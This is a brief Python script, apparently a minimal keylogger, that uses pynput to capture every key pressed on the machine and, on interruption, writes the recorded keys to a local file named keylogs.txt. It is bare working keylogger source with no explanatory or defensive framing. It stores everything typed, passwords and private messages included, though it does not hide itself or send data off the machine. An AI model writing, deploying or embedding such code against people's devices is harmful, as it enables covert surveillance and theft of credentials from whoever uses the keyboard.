from pynput import keyboard
import os

keylogs = []

def on_press(key):
    keylogs.append(str(key))

listener = keyboard.Listener(on_press=on_press)
listener.start()

try:
    while True:
        pass
except KeyboardInterrupt:
    pass

listener.stop()

with open("keylogs.txt", "w") as f:
    for key in keylogs:
        f.write(key)